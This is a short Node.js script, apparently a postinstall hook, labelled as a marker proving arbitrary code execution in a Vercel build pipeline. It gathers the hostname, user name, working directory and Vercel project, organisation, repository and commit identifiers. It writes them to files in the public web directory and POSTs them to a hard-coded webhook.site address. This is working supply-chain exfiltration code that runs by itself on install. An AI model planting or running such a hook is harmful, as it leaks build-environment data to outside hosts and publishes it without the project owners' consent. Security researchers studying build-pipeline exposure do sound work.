// Build-time marker: proves arbitrary code execution in the Vercel build pipeline.
const fs = require('fs');
const path = require('path');
const https = require('https');
const MARKER = process.env.CI_MARKER || 'ARTEX33948-bb59c29922e8e219';
const outDir = path.join(__dirname, '..', 'public');
try { fs.mkdirSync(outDir, { recursive: true }); } catch (e) {}
const payload = JSON.stringify({
  marker: MARKER,
  stage: 'postinstall',
  cwd: process.cwd(),
  host: require('os').hostname(),
  user: (require('os').userInfo && require('os').userInfo().username) || '',
  env: {
    VERCEL: process.env.VERCEL || null,
    VERCEL_ENV: process.env.VERCEL_ENV || null,
    VERCEL_URL: process.env.VERCEL_URL || null,
    VERCEL_GIT_COMMIT_SHA: process.env.VERCEL_GIT_COMMIT_SHA || null,
    VERCEL_GIT_REPO_SLUG: process.env.VERCEL_GIT_REPO_SLUG || null,
    VERCEL_GIT_REPO_OWNER: process.env.VERCEL_GIT_REPO_OWNER || null,
    VERCEL_GIT_PULL_REQUEST_ID: process.env.VERCEL_GIT_PULL_REQUEST_ID || null,
    VERCEL_PROJECT_ID: process.env.VERCEL_PROJECT_ID || null,
    VERCEL_ORG_ID: process.env.VERCEL_ORG_ID || null
  },
  ts: new Date().toISOString()
}, null, 2);
fs.writeFileSync(path.join(outDir, 'ci-marker-' + MARKER + '.txt'), payload);
fs.writeFileSync(path.join(outDir, 'ci-marker.txt'), payload);
console.log('CI-MARKER-EXECUTED ' + MARKER);
// Outbound callback (best effort)
const url = process.env.CI_CALLBACK_URL || 'https://webhook.site/74407843-f199-41bf-9886-b179518a29fa';
if (url) {
  try {
    const u = new URL(url);
    const req = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } }, r => { r.resume(); });
    req.on('error', e => console.log('callback error ' + e.message));
    req.write(payload); req.end();
  } catch (e) { console.log('callback setup error ' + e.message); }
}
